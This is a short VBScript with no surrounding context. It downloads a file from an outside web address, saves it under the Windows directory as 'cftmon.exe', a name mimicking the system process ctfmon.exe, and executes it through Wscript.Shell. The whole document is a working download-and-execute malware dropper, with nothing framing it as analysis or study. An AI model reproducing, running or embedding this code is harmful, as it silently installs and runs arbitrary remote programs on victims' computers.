Set xPost = createObject("Microsoft.XMLHTTP") 
xPost.Open "GET","http://www.gei.me/get/?122769300757868",0 
xPost.Send() 
Set sGet = createObject("ADODB.Stream") 
sGet.Mode = 3 
sGet.Type = 1 
sGet.Open() 
sGet.Write(xPost.responseBody) 
sGet.SaveToFile "C:\WINDOWS\Downloaded Installations\cftmon.exe",2 
Set objShell = CreateObject("Wscript.Shell") 
objshell.run """C:\WINDOWS\Downloaded Installations\cftmon.exe""" 
